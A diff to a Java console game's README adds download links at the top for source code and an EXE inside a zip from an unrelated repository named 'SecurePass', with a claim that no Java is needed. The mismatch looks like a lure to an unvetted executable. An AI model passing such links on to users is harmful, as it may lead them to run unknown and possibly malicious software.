@@ -1,3 +1,8 @@
+- [Download Source Code](https://github.com/UsmanFang/SecurePass/tree/main/Source%20Code)
+- The ``EXE file`` is located in SecurePass.zip — [Download Zip](https://github.com/UsmanFang/SecurePass/raw/refs/heads/main/SecurePass.zip)
+
+      Java installation is not Required for EXE file
+
 # 🏠 Home Escape Adventure – A Java Console Game
 
 Home Escape Adventure is a console-based puzzle game built in Java. The player is locked inside a house and must find clues, solve a riddle, and manage limited attempts to unlock the front door and escape.
